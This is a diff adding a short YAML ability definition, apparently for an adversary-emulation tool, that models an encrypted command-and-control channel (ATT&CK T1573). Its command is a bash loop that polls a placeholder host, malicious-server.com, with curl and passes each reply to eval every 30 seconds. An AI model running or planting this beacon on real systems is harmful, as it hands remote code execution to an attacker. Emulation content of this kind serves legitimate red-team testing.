@@ -1,0 +1,19 @@
+- description: 'Establish encrypted command and control communication with a compromised system.'
+  id: fb827394b296192cb7a81031a2e37ae2
+  name: INF808 - Encrypted Command and Control Channel
+  platforms:
+    linux:
+      psh:
+        cleanup: ''
+        command: |
+                  # Établir un canal de commande et de contrôle via HTTPS
+                  echo "[*] Établissement du canal de commande et de contrôle via HTTPS"
+                  while true; do
+                    command=$(curl -s -H "User-Agent: MaliciousAgent/1.0" https://malicious-server.com/c2)
+                    eval $command
+                    sleep 30
+                  done
+  tactic: command-and-control
+  technique:
+    attack_id: T1573
+    name: Encrypted Channel
